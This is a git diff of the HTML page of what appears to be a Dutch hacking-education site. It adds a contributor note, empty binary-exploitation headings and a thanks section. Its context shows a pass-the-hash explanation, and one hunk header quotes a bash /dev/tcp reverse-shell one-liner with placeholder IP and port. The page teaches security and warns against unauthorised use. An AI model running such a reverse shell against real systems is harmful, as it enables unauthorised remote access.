@@ -472,6 +472,7 @@ vertical-align:1px;
 <p>In het kader van <a href="https://www.laatjeniethackmaken.nl" title="laatjeniethackmaken.nl">https://www.laatjeniethackmaken.nl</a> heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). </p>
 <p>Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.</p>
 <p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction. Spot je een foutje, of heb je een verzoekje voor inhoud, maak dan een <a href="https://github.com/gatochhacken/gatochhacken.github.io/issues">issue</a> aan op <a href="https://www.github.com">github</a>.</p>
+<p>Als je aan deze pagina wilt bijdragen, bekijk dan even het dankwoord onderaan.</p>
 <p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel <a href="http://wetten.overheid.nl/jci1.3:c:BWBR0001854&amp;boek=Tweede&amp;titeldeel=V&amp;artikel=138ab">138ab</a> wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
 <h1 id="protocollen">Protocollen</h1>
 <p>Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.</p>
@@ -762,8 +763,16 @@ bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
 <p>Bij pass the hash maak je gebruik van dit protocol om jezelf te authenticeren als een ander. Alhoewel wachtwoorden nooit ongehashed over het netwerk zullen gaan, en je dus niet zomaar als een ander kan inloggen als je naar zijn computer loopt, worden hashes wel over het netwerk verzonden. Aangezien een gebruiker zichzelf bij diensten (shares etc.) aanmeld met deze hash kan je die hergebruiken.</p>
 <p>Geavanceerde hacktools om pash the hash mee te doen? PSExec <a href="https://docs.microsoft.com/en-us/sysinternals/">Windows Sysinternals</a> of de vergelijkbare variant van Metasploit. Let wel op, de ene variant laat eerder een virusscanner af gaan dan de ander.</p>
 <h1 id="binary-exploitation">Binary exploitation</h1>
+<h2 id="geheugenbeheer">Geheugenbeheer</h2>
+<h3 id="stack">Stack</h3>
+<h3 id="heap">Heap</h3>
+<h2 id="beveiligingsmechanismen">Beveiligingsmechanismen</h2>
+<h3 id="aslr">ASLR</h3>
+<h3 id="no-execute">No-Execute</h3>
+<h3 id="dep">DEP</h3>
 <h1 id="dankwoord">Dankwoord</h1>
 <p>Github bedankt voor het hosten :)</p>
+<p>Wil jij ook opgenomen worden in dit dankwoord? Begin dan met bijdragen op de <a href="https://github.com/gatochhacken/gatochhacken.github.io">github</a>. Dit kan je doen door actief contributes te doen, of door issues aan te maken met fouten/requests die je graag wilt zien.</p>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-118698551-1"></script>
 <script>
